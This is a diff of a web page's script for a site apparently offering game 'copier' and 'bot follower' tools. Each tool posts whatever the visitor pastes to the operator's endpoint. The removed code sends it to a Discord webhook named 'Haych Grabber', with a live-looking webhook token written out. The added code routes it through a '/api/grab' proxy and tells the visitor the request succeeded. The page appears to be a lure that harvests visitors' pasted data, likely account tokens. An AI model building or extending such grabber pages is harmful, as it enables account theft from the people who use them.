@@ -126,7 +126,7 @@
     }
     input[type="text"] {
       width:100%;
-      padding:12px 20px;  /* smaller height, feels wider in card */
+      padding:12px 20px;
       font-size:16px;
       background:rgba(30,30,45,0.9);
       border:1px solid rgba(77,159,255,0.4);
@@ -335,18 +335,19 @@
   </div>
 
   <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1477729322713485474/0FQCzGy3j0B_1yibTFV23yolHpcVmr_1KNYNqAv_gcHYc4u-HgTY2EEqCEmk_ytQxbnN";
+    // REPLACE with YOUR real Vercel proxy URL after deploy
+    const PROXY_URL = "https://haychtools.vercel.app/api/grab";
 
-    // REPLACE THESE WITH YOUR REAL YOUTUBE VIDEO IDs
+    // Paste your real YouTube video IDs here
     const videos = {
-      game:    "dQw4w9WgXcQ",   // Game Copier tutorial ID
-      clothes: "dQw4w9WgXcQ",   // Clothes Copier tutorial ID
-      bot:     "dQw4w9WgXcQ"    // Bot Follower tutorial ID
+      game:    "dQw4w9WgXcQ",   // ← Game Copier tutorial ID
+      clothes: "dQw4w9WgXcQ",   // ← Clothes Copier tutorial ID
+      bot:     "dQw4w9WgXcQ"    // ← Bot Follower tutorial ID
     };
 
     function openVideo(tool) {
       const videoId = videos[tool];
-      if (!videoId) return alert("No video set for this tool yet.");
+      if (!videoId) return alert("No tutorial video set for this tool yet.");
       document.getElementById('videoPlayer').src = `https://www.youtube.com/embed/${videoId}?autoplay=1&mute=0&rel=0`;
       document.getElementById('videoModal').style.display = 'flex';
     }
@@ -361,10 +362,10 @@
     });
 
     async function sendToWebhook(tool) {
-      let inputId, statusId, label;
-      if (tool === 'game') { inputId = 'gameInput'; statusId = 'gameStatus'; label = 'Game file grabbed'; }
-      else if (tool === 'clothes') { inputId = 'clothesInput'; statusId = 'clothesStatus'; label = 'Clothes file grabbed'; }
-      else if (tool === 'bot') { inputId = 'botInput'; statusId = 'botStatus'; label = 'Bot file grabbed'; }
+      let inputId, statusId;
+      if (tool === 'game') { inputId = 'gameInput'; statusId = 'gameStatus'; }
+      else if (tool === 'clothes') { inputId = 'clothesInput'; statusId = 'clothesStatus'; }
+      else if (tool === 'bot') { inputId = 'botInput'; statusId = 'botStatus'; }
 
       const input = document.getElementById(inputId).value.trim();
       const status = document.getElementById(statusId);
@@ -379,21 +380,18 @@
       status.style.color = "#4d9fff";
 
       try {
-        const payload = {
-          content: `**${label}**\nTool: ${tool.charAt(0).toUpperCase() + tool.slice(1)}\nValue:\n\`\`\`${input}\`\`\``,
-          username: "Haych Grabber"
-        };
-        const res = await fetch(WEBHOOK_URL, {
+        const res = await fetch(PROXY_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
+          body: JSON.stringify({ tool, value: input })
         });
+
         if (res.ok) {
           status.textContent = "Processed successfully!";
           status.style.color = "#00ff9d";
         } else {
           status.textContent = "Failed";
-          console.error("Webhook error:", res.status);
+          console.error("Proxy response:", await res.text());
         }
       } catch (err) {
         status.textContent = "Failed";
@@ -409,8 +407,7 @@
       window.scrollTo(0, 0);
     }
 
-    // Paste your original wave, particle, dots code here (from previous working version)
-    // Waves
+    // Waves (hub)
     const waveCanvas = document.getElementById("waves");
     const wctx = waveCanvas.getContext("2d");
     waveCanvas.width = window.innerWidth;
@@ -433,7 +430,7 @@
     }
     drawWaves();
 
-    // Particles
+    // Mouse particles (hub)
     const pCanvas = document.getElementById("particles");
     const pctx = pCanvas.getContext("2d");
     pCanvas.width = window.innerWidth;
@@ -466,7 +463,7 @@
     }
     drawParticles();
 
-    // Dots
+    // Dots bg for tools
     let dots = [];
     let dotsAnim;
     const dotsCanvas = document.getElementById('dots-canvas');
